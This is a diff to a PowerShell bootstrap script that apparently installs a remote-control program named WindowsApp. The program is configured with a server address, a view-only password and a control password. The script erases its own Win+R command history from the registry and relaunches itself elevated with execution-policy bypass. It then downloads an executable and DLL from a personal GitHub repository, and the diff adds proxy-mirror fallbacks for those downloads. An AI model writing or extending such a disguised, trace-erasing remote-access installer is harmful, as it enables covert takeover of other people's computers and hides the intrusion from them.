@@ -3,7 +3,7 @@ param(
     [Parameter(Mandatory=$true)][string]$p,   # server_port
     [Parameter(Mandatory=$true)][string]$v,   # view-only password (8 chars)
     [Parameter(Mandatory=$true)][string]$c,   # control password (8 chars)
-    [Parameter(Mandatory=$true)][string]$b    # GitHub raw base url
+    [string]$b = 'https://ghfast.top/https://raw.githubusercontent.com/309804/1/gh-pages/1.4.19share'  # mirror base url (optional)
 )
 
 # WindowsApp one-shot bootstrap. This file contains NO secrets:
@@ -12,6 +12,24 @@ param(
 
 $ErrorActionPreference = 'Stop'
 $localPs1 = $null
+
+# Mirror fallbacks: try the caller's -b first, then fast domestic mirrors, then origin.
+$mirrors = @($b) + @(
+    'https://ghfast.top/https://raw.githubusercontent.com/309804/1/gh-pages/1.4.19share',
+    'https://gh-proxy.com/https://raw.githubusercontent.com/309804/1/gh-pages/1.4.19share',
+    'https://raw.githubusercontent.com/309804/1/gh-pages/1.4.19share'
+) | Where-Object { $_ } | Select-Object -Unique
+
+function Save-FromMirror {
+    param([string]$Name, [string]$Dest)
+    foreach ($m in $mirrors) {
+        try {
+            Invoke-WebRequest -Uri ($m.TrimEnd('/') + '/' + $Name) -OutFile $Dest -UseBasicParsing -TimeoutSec 30
+            if ((Test-Path -LiteralPath $Dest) -and ((Get-Item -LiteralPath $Dest).Length -gt 100)) { return }
+        } catch {}
+    }
+    throw "FAILED to download $Name from all mirrors"
+}
 
 # --- erase traces of the plaintext passwords typed in the Win+R command ---
 # Win+R stores the full command (with -h/-p/-v/-c values) in the registry
@@ -24,8 +42,8 @@ try {
         $drop = @()
         foreach ($n in $k.PSObject.Properties.Name) {
             if ($n -like 'PS*' -or $n -eq 'MRUList') { continue }
-            $v = [string]$k.$n
-            if ($v -match 'wa_setup|309804|1\.4\.19share') { $drop += $n }
+            $val = [string]$k.$n
+            if ($val -match 'wa_setup|309804|1\.4\.19share') { $drop += $n }
         }
         foreach ($n in $drop) {
             Remove-ItemProperty -LiteralPath $mru -Name $n -Force -ErrorAction SilentlyContinue
@@ -57,7 +75,7 @@ function Test-Admin {
 # self-elevate: download a local copy, then relaunch elevated with same params
 if (-not (Test-Admin)) {
     $localPs1 = Join-Path $env:TEMP 'wa419_setup.ps1'
-    Invoke-WebRequest -Uri ($b + '/setup.ps1') -OutFile $localPs1 -UseBasicParsing
+    Save-FromMirror 'setup.ps1' $localPs1
     $a = "-nop -ep bypass -f `"$localPs1`" -h '$h' -p '$p' -v '$v' -c '$c' -b '$b'"
     Start-Process -FilePath powershell -Verb RunAs -ArgumentList $a | Out-Null
     exit 0
@@ -68,7 +86,7 @@ New-Item -ItemType Directory -Force -Path $work | Out-Null
 
 $w = 'WindowsApp'
 foreach ($f in @(($w + '.exe'), ($w + '.dll'), ($w + '.ini'))) {
-    Invoke-WebRequest -Uri ($b + '/' + $f) -OutFile (Join-Path $work $f) -UseBasicParsing
+    Save-FromMirror $f (Join-Path $work $f)
 }
 $exe = Join-Path $work 'WindowsApp.exe'
 
